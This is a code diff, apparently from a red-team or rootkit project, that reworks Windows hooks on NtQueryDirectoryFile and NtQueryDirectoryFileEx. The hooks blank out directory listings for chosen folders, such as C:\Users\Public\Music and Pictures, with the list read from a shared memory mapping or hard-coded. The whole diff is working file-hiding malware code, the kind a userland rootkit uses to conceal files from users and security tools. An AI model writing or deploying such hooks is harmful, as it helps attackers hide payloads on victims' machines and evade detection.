@@ -9,10 +9,8 @@
 
 using namespace std;
 
-#pragma comment(lib, "shlwapi.lib")
-
 #define STATUS_NO_MORE_FILES 0x80000006
-#define HIDE_PATH L"c:\\rto\\hide"
+#define HIDE_PATH L"C:\\Users\\Public\\Music"
 
 typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
     HANDLE                 FileHandle,
@@ -45,64 +43,62 @@ NtQueryDirectoryFile_t		origNtQueryDirectoryFile = NULL;
 NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx = NULL;
 
 
-std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
-    // Abrir el archivo mapeado
+std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
     HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
     LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
-
-    // Obtener los datos serializados
     std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
-
-    // Convertir std::wstring de nuevo a wchar_t*
-    std::vector<wchar_t*> deserializedData;
+    std::vector<std::wstring> deserializedData;
     size_t pos = 0;
-    wchar_t* token;
+    std::wstring token;
     while ((pos = serializedData.find(L',')) != std::wstring::npos) {
-        token = new wchar_t[pos + 1];
-        wcsncpy(token, serializedData.c_str(), pos);
-        token[pos] = L'\0';
+        token = serializedData.substr(0, pos);
         deserializedData.push_back(token);
         serializedData.erase(0, pos + 1);
     }
-
     if (!serializedData.empty()) {
-        token = new wchar_t[serializedData.size() + 1];
-        wcsncpy(token, serializedData.c_str(), serializedData.size());
-        token[serializedData.size()] = L'\0';
-        deserializedData.push_back(token);
+        deserializedData.push_back(serializedData);
     }
-
-
     return deserializedData;
 }
 
 NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+    vector<wstring> hiddenPaths;
+    hiddenPaths = deserializeWStringVector(L"pathMapped");
+
     NTSTATUS status = STATUS_NO_MORE_FILES;
     WCHAR dirPath[MAX_PATH + 1] = { 0 };
+
     if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
-        if (StrStrIW(dirPath, HIDE_PATH))
-            ZeroMemory(FileInformation, Length);
-        else
-            // otherwise - proceed with normal call
-            status = origNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+        std::wstring dirPathStr(dirPath);
+
+        for (const auto& hiddenPath : hiddenPaths) {
+            if (dirPathStr.find(hiddenPath) != std::wstring::npos) {
+                ZeroMemory(FileInformation, Length);
+                return status;  // Exit the loop and function if the path is hidden
+            }
+        }
+        status = origNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
     }
     return status;
 }
 
 
 NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
+    vector<wstring> hiddenPaths = { L"C:\\Users\\Public\\Music", L"C:\\Users\\Public\\Pictures" };
+    OutputDebugString(L"HookedNtQueryDirectoryFileEx");
     NTSTATUS status = STATUS_NO_MORE_FILES;
     WCHAR dirPath[MAX_PATH + 1] = { 0 };
 
     if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
-        // if so, return empty structure
-        if (StrStrIW(dirPath, HIDE_PATH)) {
-            ZeroMemory(FileInformation, Length);
+        std::wstring dirPathStr(dirPath);
+
+        for (const auto& hiddenPath : hiddenPaths) {
+            if (dirPathStr.find(hiddenPath) != std::wstring::npos) {
+                ZeroMemory(FileInformation, Length);
+                return status;  // Exit the loop and function if the path is hidden
+            }
         }
-        else {
-            // in other case, call original function
-            status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
-        }
+        status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
     }
     return status;
 }
